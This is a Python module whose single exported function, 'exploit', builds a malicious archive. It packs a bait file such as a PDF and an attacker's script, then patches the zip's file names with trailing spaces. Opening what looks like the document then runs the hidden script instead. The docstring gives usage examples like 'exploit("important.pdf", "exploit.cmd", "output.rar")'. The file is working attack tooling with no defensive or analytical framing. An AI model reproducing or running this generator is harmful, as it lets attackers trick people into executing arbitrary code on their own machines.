import string
import random
import os
import shutil
import tempfile
from typing import Callable

__all__ = ["exploit"]

_empty_log = lambda *a, **kw: None

def check_path_validity(bait:str, switch:str, output:str, ignore_path_check:bool=False, verbose_log:Callable=_empty_log) -> bool:
    '''
    Checks if the given paths are valid. If not, prints the error and returns False. If they are valid, returns True.

    Args:
        bait (str): Path to the bait file.
        switch (str): Path to the switch file.
        output (str): Path to the output file.
        ignore_path_check (bool): If True, will ignore the path check and will allow overwriting existing files and creating new folders.
        verbose_log (Callable): A function that will be called with a string as an argument. If not provided, will not print anything.
    
    Returns:
        bool: True if all paths are valid, False otherwise.
    '''
    verbose_log(f"Checking bait validity: {bait}")
    if not os.path.isfile(bait):
        print(f"Incorrect bait file. Make sure the file exist at given path.")
        return False
    if not os.path.isfile(switch):
        print(f"Incorrect switch file. Make sure the file exist at given path.")
        return False
    if os.path.isfile(output):
        if not ignore_path_check:
            print(f"Output file already exist. Please remove it or choose another path.")
            print(f"Optionally, specify the -i or --ignore-path-check flag to allow overwriting the output file.")
            return False
        else:
            verbose_log(f"Output file already exist, but --ignore-path-check flag is provided.")
    output_folder = os.path.dirname(output)
    if(output_folder and not os.path.isdir(output_folder)):
        if not ignore_path_check:
            print(f"Output folder does not exist. Please create it or choose another path.")
            print(f"Optionally, specify the -i or --ignore-path-check flag to allow creating the output folder.")
            return False
        else:
            verbose_log(f"Output folder does not exist, but --ignore-path-check flag is provided. Creating given path.")
            os.makedirs(output_folder, exist_ok=True)
    return True



def exploit(bait:str, switch:str, output:str, ignore_path_check:bool=False, dont_use_tempdir:bool=False, preserve_temp:bool=False, verbose_log:Callable=_empty_log):
    """
    Creates the exploit file which will execute the "switch" script when "bait" file is opened.
    Usage::

        exploit("important.pdf", "exploit.cmd", "output.rar")
        exploit("important.pdf", "exploit.cmd", "output.zip", ignore_path_check=True, dont_use_tempdir=True, preserve_temp=True, verbose_log=print)
    
    Args:
        bait (str): Path to the bait file.
        switch (str): Path to the switch file.
        output (str): Path to the output file.
        ignore_path_check (bool): If True, will ignore the path check and will allow overwriting existing files and creating new folders.
        dont_use_tempdir (bool): If True, will not use a temporary directory and will create the zip file in the current directory.
        preserve_temp (bool): If True, will not delete the temporary directory after creating the zip file.
        verbose_log (Callable): A function that will be called with a string as an argument. If not provided, will not print anything.
    Returns:
        None: None
    """
    if(not check_path_validity(bait, switch, output, ignore_path_check)):
        return
    
    if dont_use_tempdir:
        temp_dir = ''.join(random.choice(string.ascii_letters) for i in range(12))
        os.makedirs(temp_dir, exist_ok=True)
    else:
        temp_dir = tempfile.mkdtemp()
    verbose_log(f"Working on temporary directory: {temp_dir}")
    base_bait_name = os.path.basename(bait)
    original_switch_extension = switch.split(".")[-1]
    bait_len = len(base_bait_name) + 1
    final_switch_len = bait_len + len(original_switch_extension) + 1
    bait_placeholder = ''.join(random.choice(string.ascii_letters) for i in range(bait_len))
    switcheroo_path_placeholder = ''.join(random.choice(string.ascii_letters) for i in range(bait_len))
    switch_placeholder = ''.join(random.choice(string.ascii_letters) for i in range(final_switch_len))
    

    switcheroo_path  = os.path.join(temp_dir, switcheroo_path_placeholder)
    os.mkdir(os.path.join(temp_dir, switcheroo_path_placeholder))
    verbose_log(f"Using placeholders for bait and switch. Bait:{bait_placeholder}, Switch:{switch_placeholder}, Switch path:{switcheroo_path_placeholder}")
    verbose_log(f"Copying bait to {os.path.join(temp_dir, bait_placeholder)}")
    shutil.copyfile(bait, os.path.join(temp_dir, bait_placeholder))
    verbose_log(f"Copying switch to {os.path.join(temp_dir, switcheroo_path_placeholder, switch_placeholder)}")
    shutil.copyfile(switch, os.path.join(temp_dir, switcheroo_path_placeholder, switch_placeholder))

    verbose_log(f"Creating switcheroo file at {switcheroo_path}")
    shutil.make_archive(temp_dir, 'zip', temp_dir)

    with open(f"{temp_dir}.zip", "rb") as temp_zip:
        zip_contents = temp_zip.read()
        
        zip_contents = zip_contents.replace(bait_placeholder.encode(), base_bait_name.encode() + b" ")
        zip_contents = zip_contents.replace(switch_placeholder.encode(), base_bait_name.encode() + b" ." + original_switch_extension.encode())
        zip_contents = zip_contents.replace(switcheroo_path_placeholder.encode(), base_bait_name.encode() + b" ")
        with open(output, "wb") as output_file:
            output_file.write(zip_contents)

    if(dont_use_tempdir and not preserve_temp):
        shutil.rmtree(temp_dir)
    os.remove(f"{temp_dir}.zip")
    print(f"Done! Output written to {output}")
